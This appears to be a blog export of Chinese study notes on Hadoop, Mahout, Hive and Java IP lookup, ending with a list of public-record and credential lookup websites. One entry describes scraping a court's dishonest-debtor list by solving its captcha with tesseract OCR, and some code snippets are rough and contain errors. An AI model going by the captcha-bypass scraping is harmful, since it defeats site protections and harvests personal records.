Enterprise Linux 配置hdfs_steam script文件 ... (hadoop_v4_13d) /logs /extdir !cat lab4.2_setup_DB_dir.sql set echo on create or replace directory ODCH_LOG_DIR as &apos;/home/hadoop/.../logs&apos; grant read,write on directory ODCH_LOG_DIR to SCOTT; @lab4.2_setup_DB_dir.sql sqlplus scott/tiger !cat lab4.3_ext_tab.sql SQL创建外部表 preprocessor HDFS_BIN_PATH:hdfs_stream //先预处理数据再读 PROMPT&gt;sqlplus scott/tiger select count(*) from odch_ext_table; set autotrace trace exp //设置追踪，来观察执行计划 select count(*) from odch_ext_para_table; CDN加速 Flume 提供分布式，可靠和高可用的海量日志采集，聚合和传输的系统 Chukwa //note14 扩展开发，与应用集成 UDF （用户定义函数） （reg：Pig，Hive） Thrift接口 Rhadoop UDF 写个自定义jar create temporary function strip as &apos;com.hadoopbook.hive.[ClassName]&apos; % hive --auxpath /path/to/hive-example.jar select xxx(&apos;name&apos;) from student filter: jar register pig-examples.jar grunt&gt;filter.... com.hadoopbook.pig.xxxx(xxx); DEFINE isGood com.hadoopbook.pig.xxxx(); 然后就可以用 isGood(xxx); 应用与Hbase的对接：通过Thrift Thrift是一个跨语言的服务部署框架 通过一个中间语言（IDL，接口定义语言）来定义RPC的接口和数据类型 //note15 与应用层连接 并行计算框架 MPI PVM Mesos Map-Reduce YARN 可以同时支持Map-Reduce，Storm，Spark，MPI等多种流行计算模型 Spark YARN配置 //note16 hadoop源代码 //note17 hadoop与机器学习 Hadoop与机器学习 Mahout （封装各种算法）（天生适合做离线数据分析） Hadoop在互联网企业中的应用 spark基于内存来计算。成本比hadoop高 不要求实时得出结果，可以不选spark spark不太好转，跟java几乎无关 Mahout （在Data Mining上） 数据金字塔：从下往上 Making Decisions （决策层） Data Presentations （数据展示层） Data Mining （数据挖掘，建立数学模型/算法，找到一种合适的算法） Data Exploration （对数据进行简单的查询） Data Warehouses/Data Marts ETL（数据仓库） Data Sources （数据源） 回归 样本这里叫学习集 用来做预测 分类器 决策树 贝叶斯分类器（顾客流失）（自己设置阈值）（文本分类）（搜索引擎判断两篇文章是否一致，概率多高） 有学习集的进行特征提取就可以自动完成 聚类（没有学习集） （层次聚类法） 数据挖掘 数据分析 SAS，R，SPSS SAS数据是经过检验的，R就不太可靠，SAS主要应用于金融 传统数据分析工具的困境 处理数据受限于内存，因此无法处理海量数据（R处理上限可能是100万）（R跟SAS处理不能超过内存数，不然会机器异常） ... （聚类，推荐系统就无法使用抽样） 解决方向：hadoop集群和Map-Reduce并行计算 常见算法的Map-Reduce化 样本独立性比较强的就可以map-reduce Lucene 早期搜索引擎的项目 Mahout的特点： 下载和解压Mahout wget http://mirrors.cnnic.cn/apache/mahout/0.6/mahout-distribution-0.6.tar.gz tar xzf ./mahout-distribution-0.6.tar.gz 配置环境变量 export HADOOP_HOME=/home/huang/hadoop-1.1.2 export HADOOP_CONF_DIR=/home/huang/hadoop-1.1.2/conf export MAHOUT_HOME=/home/huang/hadoop-1.1.2/mahout-distribution-0.6 export MAHOUT_CONF_DIR=/home/huang/hadoop-1.1.2/mahout-distribution-0.6/conf export PATH=$PATH:$MAHOUT_HOME/conf:$MAHOUT_HOME/bin 几个重要环境变量 JAVA_HOME mahout运行需指定jdk的目录 MAHOUT_JAVA_HOME指定此变量可覆盖JAVA_HOME值 HADOOP_HOME 如果配置，则在hadoop分布式平台上运行，否则单机运行 HADOOP_CONF_DIR指定hadoop的配置文件目录 MAHOUT_LOCAL 如果此变量值不为空，则单机运行mahout。 MAHOUT_CONF_DIR mahout配置文件的路径，默认值是$MAHOUT_HOME/src/conf MAHOUT_HEAPSIZE mahout运行时可用的最大heap大小 （堆大小） 验证安装成功 bin/mahout 源码和部分样本数据 装的时候要装源代码包(即-src的包) 将测试数据copy到HDFS hadoop/bin/hadoop fs -mkdir ./testdata hadooop/bin/hadoop fs -put ./synthetic_control.data ./testdata hadoop/bin/hadoop fs -ls ./testdata 做一个kmeans测试（聚类测试） mahout org.apache.mahout.clustering.syntheticcontrol.kmeans.Job 观察输出 用mahout输出 mahout vectordump --seqFile ./output/data/part-m-00000 20Newsgroups数据集 使用Mahout进行文本自动分类 上传并解压数据 20news-bydate-test 测试数据 20news-dydate-train 训练数据 建立训练集 mahout org.apache.mahout.classifier.bayes.PrepareTwentyNewsgroups \ -p /home/huang/data/20news-bydate-train \ -o /home/huang/data/bayes-test-input \ (结果输出到了本地。。) -a org.apache.mahout.vectorizer.DefaultAnalyzer \ -c UTF-8 （作了分词什么的。。） 上传到HDFS cd ../hadoop-1.1.2 bin/hadoop fs -mkdir ./20news bin/hadoop fs -put ../data/bayes-train-input ./20news bin/hadoop fs -put ../data/bayes-test-input ./20news 训练贝叶斯分类器 mahout trainclassifier \ -i /user/huang/20news/bayes-train-input \ -o /user/huang/20news/newsmodel \ （放输出的模型，即统计参数数据） -type cbayes -ng 2 \ -source hdfs 生成的模型 bin/hadoop fs -ls ./20news/newsmodel (里面放了一堆模型数据) 测试贝叶斯分类器 mahout testclassifier \ -m /user/huang/20news/newsmodel \ -d /user/huang/20news/bayes-test-input \ -type cbayes -ng 2 \ -source hdfs \ -method mapreduce 京东 部门结构  运维团队(负责管理维护集群的正常运行)  数据仓库团队(根据业务部门的要求进行数据统计和查询)  成都研究院(负责底层，包括源代码修改和按上层部门要求开发 Map-Reduce程序，比如一些UDF) 淘宝 对Hadoop源码的修改 管理模式 准实时的流数据处理技术  从Oracle, Mysql日志直接读取数据  部分数据源来自应用消息系统  以上数据经由Meta+Storm的流数据处理，写入HDFS，实现实时或准实时的数据分析  数据装载到Hive进行处理，结果写回Oracle和Mysql数据库 Oceanbase 百度  日志的存储和统计;  网页数据的分析和挖掘;  商业分析，如用户的行为和广告关注度等;  在线数据的反馈，及时得到在线广告的点击情况;  用户网页的聚类，分析用户的推荐度及用户之间的关联度。]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>大数据</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>大数据</tag>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[失信名单人爬取笔记01]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%A4%B1%E4%BF%A1%E5%90%8D%E5%8D%95%E4%BA%BA%E7%88%AC%E5%8F%96%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[失信名单人爬取 http://shixin.court.gov.cn/ 数据采集复杂度确定 1、是否为Https类采集，需要添加证书等操作 2、是否需要模拟登陆 3、模拟登陆的复杂度判定 4、验证码复杂度 5、站点反爬方式 6、站点的反爬力度 7、站点本身的个性方面：资源稀缺性、采集强度、采集量级要求 自前往后 自后往前 随机插入 如果有Received，即意味着发生了改变 //测试的时候可以通过Java GUI来得到输入的验证码 VerifyGuiUtil verifyGuiUtil = new VerifyGuiUtil(); String flag = &quot;login&quot;; String verify_code_input = verifyGuiUtil.getVerifyCode(flag,null,&quot;test_ts&quot;,1); sout(&quot;输入的验证码=&quot; + verify_code_input); 自动采集分析： 1、验证码可以重复输入支持 2、tesseract安装与简单测试 3、tesseract的验证码识别工具组件化 4、tesseract识别失信人验证码 cmd-&gt;in pwd tesseract.exe test.jpg tttt CmdProcessUtil.java: (部分) public static boolean process(String binPath,String paras){ BufferedReader br = null; try{ Runtime runtime = Runtime.getRuntime(); String command_line = binPath + &quot; &quot; + paras; logger.info(&quot;command_line ---&quot; + command_line); Process process = runtime.exec(command_line); InputStream is = process.getInputStream(); process.getErrorStream().close(); process.getOutputStream().close(); br = new BufferedReader(new InputStreamReader(is)); String temp = null; while((temp = br.readline())!=null){ sout(temp); } return true; }catch(){ logger.info(&quot;phantomjs 在爬取网页信息时出现异常，请检查&quot;); logger.info(e.getLocalizedMessage()); return false; }finally{ if(br != null){ try{ br.close(); }catch(){ xxx } } } psvm(){ String binPath = &quot;D:\\xxxx\\tesseract.exe&quot;; String paras = &quot;verify.jpg result&quot;; boolean exec_flag = CmdProcessUtil.process(binPath,paras); String verify_code = IOUtil.readFile(&quot;result.txt&quot;,&quot;utf-8&quot;).trim(); } }]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>Java</category>
        <category>爬虫</category>
        <category>采集</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大数据采集学习笔记01-实时热点]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-%E5%AE%9E%E6%97%B6%E7%83%AD%E7%82%B9%2F</url>
    <content type="text"><![CDATA[APP热点标签分析 需求分析 给定一批app名称及其描述信息，共52.9万条数据 其内容结构为，共包含6个字段，分别为（appId,app名称，一级分类，二级分类，三级分类，Tags描述信息），但并不一定完全规整，视实际情况可能做对齐包括4个或5个或6个字段。 通过大数据开发之hive数据仓库命令行形式，完成数据加载，udf/udaf/udtf函数，统计分析的任务，并演示项目效果即可。 主要思路 通过hive命令将数据加到数据仓库中 使用hql+udf/udaf/udtf完成统计分析 将统计分析结果插入到hive中自建的新表中 主要考点 hive及hiveSQL常用命令 系统函数+udf/udaf/udtf灵活使用 hive常见问题的解决 技术组成：hive sql+udf/udaf/udtf 步骤拆解： 1）输入，输出表设计到位 （1-0.4h） 2）将数据加载到输入表中 （1-04h） 3）hivesql+udf/udaf/udtf实现热词统计与写入库表 （1-0.5h） 开发细节 4.0 prepare 1）相关目录创建 config:存放相关配置变量 create:存放表结构数据 deal:具体的sql脚本 udf:udf/udaf/udtf相关的jar包 4.1 按步骤执行 5.bug修复，调优 6.上线 6.1项目部署 6.2上线 //输入表 //怎么区分内表还是外表，外部引入的一般都是外表 //规定一下分割，存储格式 create external table app_tag_meta_info( id string, name string, first_classify string, second_classify string, third_classify string, tags string ) #建成分区表 partitioned by (dt string comment &apos;update date&apos;) row format delimited fields terminated by &apos;\t&apos; lines terminated by &apos;\n&apos; stored as textfile; touch config.sh 或者 touch set_env.sh #! /bin/bash HIVE=&apos;/usr/bin/hive&apos; #source set_env.sh sh set_env.sh 不是在本窗口添加环境变量的，而是开了新窗口添加的环境变量 //改权限 chown -R hive 文件夹名. -R为递归赋予hive权限 [...config]#cd ../create/ touch app_tag_meta_info.sh #! /bin/bash source ../config/set_env.sh db=&quot;job_002&quot; table_name=&quot;app_tag_meta_info&quot; $HIVE -e &quot; use $db; create external table $table_name( id string, name string, first_classify string, second_classify string, third_classify string, tags string ) partitioned by (dt string comment &apos;update date&apos;) row format delimited fields terminated by &apos;\t&apos; lines terminated by &apos;\n&apos; stored as textfile; &quot; # sh app_tag_meta_info use job_002 show tables desc app_tag_meta_info 如果要修改.sh文件的话，不能直接修改，要删除已有的sh出来的表再重新建立 drop table app_tag_meta_info; sh .... //输出表 create table hot_tag_rank( tag string, freq int, ) partitioned by (dt string comment &apos;update date&apos;) row format delimited fields terminated by &apos;\t&apos; lines terminated by &apos;\n&apos; stored as textfile; sh app_tag_meta_info //将数据加载到数据表中 [create] # ../deal rz -y touch produce_app_tag_meta_info.sh #! /bin/bash source ../config/set_env.sh updateDT=$1 //$1 即第一个传入的参数 一般放在最前面 db=&quot;job_002&quot; table_name = &quot;app_tag_meta_info&quot; jar_path=&quot;&quot; class_path=&quot;&quot; data_source_path=&quot;app_abstract_info.txt&quot; $HIVE -e &quot; use $db; load data local inpath &apos;$data_source_path&apos; overwrite into table $table_name partition(dt=&apos;$updateDT&apos;) &quot; sh xxx.sh select * from app_tag_meta_info limit 10; show partitions app_tag_meta_info //查看分区 //setp1:找到tag字段 select tags from app_tag_meta_info limit 10; //修改上句，改为集合 select split(tags,&apos;,&apos;) from app_tag_meta_info limit 10; //再把上句改为字符串 //setp2:拆分字段 select explode(split(tags,&apos;,&apos;)) from app_tag_meta_info limit 10; (不采用) //step3:用lateral view包装 select tag from app_tag_meta_info laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag limit 10; (采用)(即不使用 as tag 这种形式，避免了后面的where 无法使用tag的形式) //step4:bug解决和优化（去空格） select tag from app_tag_meta_info laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag where tag !=&apos;&apos; limit 10; //按频次倒排 select tag,count(1) as freq from app_tag_meta_info laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag where tag !=&apos;&apos; and tag != &apos;-&apos; group by tag order by freq limit 10; //这里select先执行order by后执行，所以可以看到前面的函数值 set hive.execution.engine=tez; //将结果集写入到表中 分区表用overwrite写入 insert overwrite table hot_tag_rank partition(dt=&apos;20180507&apos;) select tag,count(1) as freq from app_tag_meta_info laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag where tag !=&apos;&apos; and tag != &apos;-&apos; and dt=&apos;20180507&apos; group by tag order by freq desc; //封装成sh #! /bin/bash source ../config/set_env.sh updateDT=$1 db=&quot;job_002&quot; table_name = &quot;hot_tag_rank&quot; jar_path=&quot;&quot; class_path=&quot;&quot; $HIVE -e &quot; use $db; set hive.execution.engine=tez; //这里是设置引擎 insert overwrite table $table_name partition(dt=$updateDT&apos;) select tag,count(1) as freq from app_tag_meta_info laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag where tag !=&apos;&apos; and tag != &apos;-&apos; and dt=&apos;$updateDT&apos; group by tag order by freqd desc; &quot; //改bug sh xxxx.sh 20180507 //写入口 [deal]# touch a_main.sh #! /bin/bash #得到当前日期 currentDT=&apos;date+%Y%m%d&apos; echo &quot;currentDT=&quot;$currentDT #将文本文件数据加载到app_tag_meta_info表中 echo &quot;start load data to table process&quot; sh produce_app_tag_meta_info.sh $currentDT echo &quot;end&quot; #生成统计排序的热度标签数据 echo &quot;start insert tag rank data&quot; sh produce_hot_tag_rank.sh $currentDT echo &quot;end&quot; echo &quot;all done!&quot; //next cp hot_tag_rank.sh hot_tag_rank_rcfile.sh #! /bin/bash db=&quot;job_002&quot; table_name=&quot;hot_tag_rank_rcfile&quot; $HIVE -e &quot; use $db; create table $table_name( tag string, freq int ) partitioned by (dt string comment &apos;update date&apos;) STORED AS rcfile; //面向列分组 &quot; # desc hot_tag_rank_rcfile # show create table hot_tag_rank_rcfile [deal]# cp produce_hot_tag_rank.sh produce_hot_tag_rank_rc.sh #! /bin/bash source ../config/set_env.sh updateDT=$1 db=&quot;job_002&quot; output_table_name_1 = &quot;hot_tag_rank_rcfile&quot; input_table_name_1 = &quot;app_tag_meta_info&quot; jar_path=&quot;&quot; class_path=&quot;&quot; $HIVE -e &quot; use $db; set hive.execution.engine=tez; //这里是设置引擎 insert overwrite table $output_table_name_1 partition(dt=$updateDT&apos;) select tag,count(1) as freq from $input_table_name_1 laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag where tag !=&apos;&apos; and tag != &apos;-&apos; and dt=&apos;$updateDT&apos; group by tag order by freqd desc; &quot; vi a_main.sh #生成统计排序的热度标签数据 echo &quot;start insert tag rank data&quot; sh produce_hot_tag_rank_rc.sh $currentDT echo &quot;end&quot; //查看变化 //查找rcfile路径 [slave]$ hdfs dfs -ls 路径 出来路径之后在后面输入dt=20180507 出现/dt=20180507/000000_0 //再来一个不是rcfile的路径 再在路径后面输入dt=20180507 也是得到000000_0 //查看里面的内容 # hdfs dfs -text 空间大小 时间 /xxxx/xxx/dt=20180507/* | more rcfile自带压缩。 所以rcfile空间大小要低一些 hive --service rcfilecat /xxxxx/00000_0 //查看里面的内容,但是里面会乱码 一般用select查看]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>大数据</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大数据日志分析学习笔记01--IP地址查找]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-IP%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BE%2F</url>
    <content type="text"><![CDATA[IP地址查找 myhope365.com 大数据日志分析中，经常会根据访问的来源IP地址 来判定该访客的所属省，市，区甚至更精准的位置信息。从而对该访问打上相应的位置标签 现在各大搜索引擎或专门IP服务公司，均提供类似的服务 需求分析： 通过命令行来演示项目效果即可，查找用时要求再ms内完成 IP地址库思考：很多公司在提供相应的服务，说明这方面的服务是有相应的公开数据的，只是细节更新上各有差异 IP地址库开放位置： https://pan.baidu.com/s/1Iu0FrjYIP1QtoL63_w48Ug 899x (失效) 通过相应的地址库搜索或是查找算法，实现给定IP地址，找到其对应位置信息的功能 思路和考点： 思路： 解析提供的地址库字符串，为结构化数据形式 基于结构化数据构建，数据结构，加速给定IP地址的查找速度 封装成相应的工具类API，开放其相应方法，即给定IP地址可以在ms内计算得到其位置信息 考点： 面向对象程序设计 工具类封装与使用写法 文件IO 字符串处理 二分查找 ip地址的不同形式的使用 1.需求说明 2.需求分析 3.方案设计 技术组成：javase编程，IO，二分查找实现 步骤拆解： 1）文件读取，逐行形成IP地址和位置信息的对象 （同事1-0.4h） 2）对象组织成有序数据集合结构 (同事1-0.4h) 3）实现二分查找 (同事1-0.5h) 4）给定IP地址，利用第2，3步，获取其位置 (同事1-0.4h) 5）封装工具类 (同事1-0.2h) 4.开发细节 5.BUG修复，调优 6.上线 com.tl.job002.pojos IPAndLocationPojo(); com.tl.job002.manager DataLoadManager(); DataSearchManager(); com.tl.job002.utils IOUtils(); IPAndLongConverUtil(); public class IPAndLocationPojo implements Comparable&lt;IPAndLocationPojo&gt;{ private String startIp; private String endIp; private String location; private long startIPLong; private long endIpLong; @Override public int compareTo(IPAndLocationPojo o){ return this.endIpLong - o.startIpLong &gt; 0 ? 1 : 0; } public IPAndLocationPojo(xxx){ super(); xxx this.startIPLong = IPAndLongConverUtil.ipToLong(startIp); this.endIPLong = IPAndLongConverUtil.ipToLong(endIp); } setter and getter } public class DataLoadManager{ public static List&lt;IPAndLoacationPojo&gt; getPojoList(List&lt;String&gt; ipAddressList){ for(String line:ipAddressList){ line = line.trim(); if(line.length()==0){ continue; } String columnArray = line.split(&quot;\t&quot;); if(columnArray.length!=3){ continue; } IPAndLocationPojo pojo = new IPAndLocationPojo(columnArray[0],columnArray[1],columnArray[2]); pojoList.add(pojo); } return pojoList; } public static List&lt;IPAndLoacationPojo&gt; getPojoList(String ipPath){ //把文本文件加载到内存的字符串集合中 List&lt;String&gt; lineList = IOUtil.getLineList(ipPath,&quot;UTF-8&quot;); //把String集合解析成对应的集合对象 List&lt;IPAndLocationPojo&gt; pojoList = new ArrayList&lt;IPAndLocationPojo&gt;(); return pojoList; } psvm(){ String ipAddressSource = &quot;/usr/bin/xxx.txt&quot;; List&lt;IPAndLocationPojo&gt; pojoList = getPojoList(ipAddressSource); sout(pojoList.size()); } } public class IOUtil{ public static List&lt;String&gt; getLineList(String txtFilePath,String encoding) throws Exception{ FileInputStream fis = new InputStream(ipAddressSource); InputStreamReader isr = new InputStreamReader(fis,&quot;utf-8&quot;); BufferedReader br = new BufferedReader(isr); String line = null; List&lt;String&gt; lineList = new ArrayList&lt;String&gt;(); while((line=br.readLine())!=null){ lineList.add(line); } br.close(); return lineList; } } public class DataSearchManager{ private IPAndLocationPojo[] sortedPojoArray = null; public DatatSearchManager(String idAddressLib){ List&lt;IPAndLocationPojo&gt; pojoList = DataLoadManager.getPojoList(idAddressLib); pojoArray = new IPAndLocationPojo[0]; pojoArray = pojoList.toArray(); } //简单测试二分查找 public static int getIndexByBinarySearch(int[] sortedArray,int startPos,int endPos,int aid){ if(startPos&lt;0 || endPos&gt;sortedArray.length || startPos &gt; endPos){ return false; } int middle = (startPos + endPos)/2; if(aid&gt;sortedArray[middle]){ startPos = middle + 1; return getIndexByBinarySearch(sortedArray,startPos,endPos,aid); }else if(aid&lt;sortedArray[middle]){ endPos = middle -1; return getIndexByBinarySearch(sortedArray,startPos,endPos,aid); } return middle; } //对象二分查找 public int getIndexByBinarySearch(int[] sortedArray,int startPos,int endPos,long ipLong){ if(startPos&lt;0 || endPos&gt;sortedArray.length || startPos &gt; endPos){ return false; } int middle = (startPos + endPos)/2; if(ipLong&gt;sortedArray[middle].getEndIpLong()){ startPos = middle + 1; return getIndexByBinarySearch(sortedArray,startPos,endPos,ipLong); }else if(aid&lt;sortedArray[middle].getStartIPLong()){ endPos = middle -1; return getIndexByBinarySearch(sortedArray,startPos,endPos,ipLong); } return middle; } //封装： public String getLocationByIPString(String ip){ int startPos = 0; int endPos = pojoArray.length - 1; String ip = &quot;1.27.248.0&quot;; Long aidToLong = IPAndLongConvertUtil.ipToLong(ip); int pos = getIndexByBinarySearch(pojoArray,startPos,endPos,aid); if(pos &gt; -1){ return pojoArray[pos].getLocation(); } return null; } psvm(){ String ipAddressSource = &quot;&quot;; String ip = &quot;1.27.233.255&quot;; DataSearchManager dsm = new DataSearchManager(ipAddressSource); long startTS = System.currentTimeMillis(); String location = dsm.getLocationByIPString(ip); long endTS = System.currentTimeMillis(); sout(endTS-startTS); } psvm(){ int[] sortedArray={1,3,5,7,11,20,30,44,55}; int startPos = 0; int endPos = sortedArray.length - 1; int aid = 1; int index = getIndexByBinarySearch(sortedArray,startPos,endPos,aid); sout(index); } } maven打包: 如果项目不是maven，则右键项目-&gt;configure-&gt;convert to Maven project &lt;sourceDirectory&gt;src&lt;/sourceDirectory&gt; &lt;!-- 意思是打的src下的包--&gt; plugins： &lt;plugin&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;!-- 意思是用这个插件来打,target是1.7的版本 --&gt; &lt;version&gt;2.3.2&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;1.7&lt;/source&gt; &lt;target&gt;1.7&lt;/target&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;descriptorRefs&gt; &lt;descriptorRef&gt; jar-with-dependencies &lt;/descriptorRef&gt; &lt;/descriptorRefs&gt; &lt;!-- 这里指定打包的主类 --&gt; &lt;archive&gt; &lt;manifest&gt; &lt;!-- 主函数入口 --&gt; &lt;mainClass&gt;com.tl.job001.controler.SystemController&lt;/mainClass&gt; &lt;/manifest&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;make-assembly&lt;/id&gt; &lt;!-- 意思是用assembly方式来打包 --&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;assembly&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; 然后项目-&gt;右键-&gt;Run As-&gt;Maven install 一个jar包，一个allinone的包 java -cp ?]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>大数据</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息收集网址大全01]]></title>
    <url>%2F2018%2F09%2F10%2F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E5%9D%80%E5%A4%A7%E5%85%A801%2F</url>
    <content type="text"><![CDATA[一、查企业查信用 1、信用中国 http://www.creditchina.gov.cn/ 2、全国企业信用信息公示 http://gsxt.saic.gov.cn/（导航） http://gsxt.saic.gov.cn/zjgs/（总局） 3、信用导航 http://www.creditchina.gov.cn/toNavigation 4、企信宝 http://www.qixin.com/ 5、企业信用信息查询APP http://www.ixy360.com/ 6、企查查 http://www.qichacha.com/ 7、企业云数据征信中心 http://www.xinyong****15.com/ 8、天眼查 http://www.tianyancha.com/ 9、信用视界 http://www.x315.com/ 全球企业信息 10、悉知 http://www.xizhi.com/ 国内企业信息含联系方式经营范围 11、发改委信用信息查询 http://credit.ndrc.gov.cn/XYXX/admin_client/form_designer/ttt/index.html 12、重大税收违法案件信息 http://hd.chinatax.gov.cn/xxk/ 13、进出口信用信息公示查询 http://credit.customs.gov.cn/ 14、网站信用信息查询 http://www.itrust.org.cn/home/index/xy_search.html 15、建筑市场监管与诚信信息发布平台 http://www.mohurd.gov.cn/docmaap/ 16、中国裁判文书网 http://wenshu.court.gov.cn/ 17、全国法院被执行人信息查询 http://zhixing.court.gov.cn/search/ 18、执行信息公开网 http://shixin.court.gov.cn/ 19、人民检察院案件信息公开网 http://www.ajxxgk.jcy.cn/html/index.html 20、全国法院减刑、假释、暂予监外执行信息网 http://jxjs.court.gov.cn/ 21、中国涉外商事海事审判网 http://www.ccmt.org.cn/cpws.php 22、中国知识产权裁判文书网 http://ipr.court.gov.cn/ 23、北大法宝 http://www.pkulaw.cn/Case/ 24、建筑企业查询 http://www.mohurd.gov.cn/wbdt/dwzzcx/index.html 工程设计、监理、建筑业企业、项目招标代理、城市规划、造价咨询、房地产开发企业 25、组织机构代码查询 http://www.nacao.org.cn/publish/main/5/index.html 26、工业产品生产许可获证企业查询 http://www.aqsiq.gov.cn/search/gyxkz/ 27、域名信息备案管理系统 http://www.miitbeian.gov.cn/publish/query/indexFirst.action http://whois.chinaz.com/ 28、全国民间组织查询 http://www.chinanpo.gov.cn/search/searchOrgList.do?action=searchOrgList 二、政府信息公开查询 29、国务院各部门行政许可事项查询服务 http://spgk.scopsr.gov.cn/pages/sgyj/index1.jsp 30、交通运输部综合查询 http://www.moc.gov.cn/chaxunfuwu/ 31、证监会信息公开 http://www.csrc.gov.cn/pub/zjhpublic/index.htm?channel=3300/3619 32、水利部综合查询 http://www.mwr.gov.cn/zxfw/zhcxfwpt/ 33、金农一期互联网应用系统 http://www.moa.gov.cn/jnyy/ 34、财政部在线查询 http://www.mof.gov.cn/zaixianfuwu/zxcx/ 35、人力资源保障部查询 http://www.mohrss.gov.cn/SYrlzyhshbzb/fwyd/zaixianchaxun/ 36、国土资源公开公示 http://www.mlr.gov.cn/zwgk/ 37、中国商品信息验证中心 http://www.china3-15.com/ 38、国家兽药基础信息查询 http://sysjk.ivdc.org.cn:8081/cx/ 39、海关总署综合查询 http://www.customs.gov.cn/publish/portal0/tab9372/ 40、国家质检总局综合查询 http://www.aqsiq.gov.cn/zhcx/ 三、身份信息查询 41、国家职业资格证书查询 http://zscx.osta.org.cn/ 42、国家职业能力证书查询 http://nlzs.osta.org.cn/ 43、会计资格查询 http://60.208.116.167/pas/querycert.jsp 44、注册会计师查询 http://cmispub.cicpa.org.cn/cicpa2_web/public/query0/2/00.shtml 45、全国技工院校毕业证书查询 http://www.jxzs.mohrss.gov.cn/ 46、国际证书查询 http://gjzs.osta.org.cn/ 47、纳税人查询 http://hd.chinatax.gov.cn/fagui/action/InitCredit.do 48、交通部执业资格证书查询 http://www.jtzyzg.org.cn/common/zszxdt/index.html 49、船员证书查询 http://cyxx.msa.gov.cn/lycx/zslycx!init.action?flag=1 http://www.cnss.com.cn/index.php?m=resource&amp;amp;c=sailor_certificate 50、社保基金监督检查证查询 http://59.252.162.99/ 51、人民银行征信中心 http://www.pbccrc.org.cn/ 52、特种设备作业人员查询 http://hr.cnse.gov.cn/ 53、执业医师查询 http://zgcx.nhfpc.gov.cn/doctorsearch.aspx 54、执业护士查询 http://zgcx.nhfpc.gov.cn/nursesearch.aspx 55、建筑执业查询 http://www.pqrc.org.cn/query.aspx 56、保险执业查询 http://iir.circ.gov.cn/ 57、律师执业查询 http://chaxun.lawyercom.cn/ 58、教师资格网 http://static.jszg.edu.cn/public/tongzhi.html 59、学历学籍查询 http://www.chsi.com.cn/xlcx/index.jsp http://www.chsi.com.cn/xlcx/bgcx.jsp#学籍/学历在线验证?cata=2147438794 http://www.chsi.com.cn/xlcx/#高等教育学历证书查询?cata=2147438794 https://account.chsi.com.cn/passport/login?service=http%3A%2F%2Fmy.chsi.com.cn%2Farchive%2Fj_spring_cas_security_check#高等教育学籍查询?cata=2147438794 60、“三支一扶”大学生信息查询 http://szyf.chrm.gov.cn/default.aspx 61、证券从业人员查询 http://person.sac.net.cn/pages/registration/sac-publicity-report.html 62、银行业从业资格查询 http://www.ccbp.org.cn/chaxun/ 63、造价员查询 http://zjybm.jianshe99.com/costweb/publichPortalLogin/view.do?op=goPublichPortalLoginInit 64、房地产估价师查询 http://xhzhglxt.cirea.org.cn/website/gjs_Iframe.asp 65、社保公积金医保查询 http://m.****33sb.com/ 66、社保查询 http://wsfw.hs****33.gov.cn/ 67、活佛查询系统 http://hf.tibet.cn/ 68、导游信息查询 http://daoyou-chaxun.cnta.gov.cn/single_info/selectlogin_1.asp 69、内蒙古低保信息查询 http://www.nmmztywpt.com/nmdb/web/xxgs_cx.jsp 70、在职硕士查询 http://zzcx.eol.cn/ 71、上海健康证查询 http://www.jkz.sh.cn/ 72、全国民办高校学生信息查询 http://www.cxedu.org.cn/xsxjcx.asp 73、身份证信息泄露核查 http://d.id5.cn/desktop/index.jsp 74、邮政职业证书查询 http://zyjd.spb.gov.cn/ 75、测绘职业资格证书查询 http://zjzx.sbsm.gov.cn/zyzgzscxxt/ 76、记者证查询 http://press.gapp.gov.cn/ 77、记者违规违纪查询 http://press.gapp.gov.cn:8088/press_search/pages/query/queryAction!findBadRecordPaging.action?badType=1 78、全国广播电视编辑记者、播音员主持人资格考试 http://211.146.5.61:7001/gdexam/public/cjcx3.jsp 79、审计职称查询 http://www.audit.gov.cn/n8/n29/index.html 